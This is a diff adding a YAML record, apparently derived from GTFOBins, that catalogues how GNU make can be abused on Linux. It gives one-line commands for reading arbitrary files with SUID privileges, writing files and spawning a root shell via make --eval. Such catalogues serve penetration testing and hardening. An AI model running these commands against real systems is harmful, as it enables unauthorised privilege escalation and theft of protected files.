@@ -1,0 +1,94 @@
+id: gtfobins/make/file-read/suid
+type: binary
+platform: linux
+name: make
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+references:
+- https://gtfobins.github.io/gtfobins/make/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        make:
+          functions:
+            file-read:
+            - binary: false
+              code: make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            file-write:
+            - code: make -s --eval='$(file >/path/to/output-file,DATA)' .
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            shell:
+            - code: make --eval='$(shell /bin/sh 1>&0)' .
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              version: GNU
+    upstream_url: https://gtfobins.github.io/gtfobins/make/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:2534ca5d73c2f9caf147a48074ae6b92a7efdbb18f5631ddf54bf6ab8cbb6d17
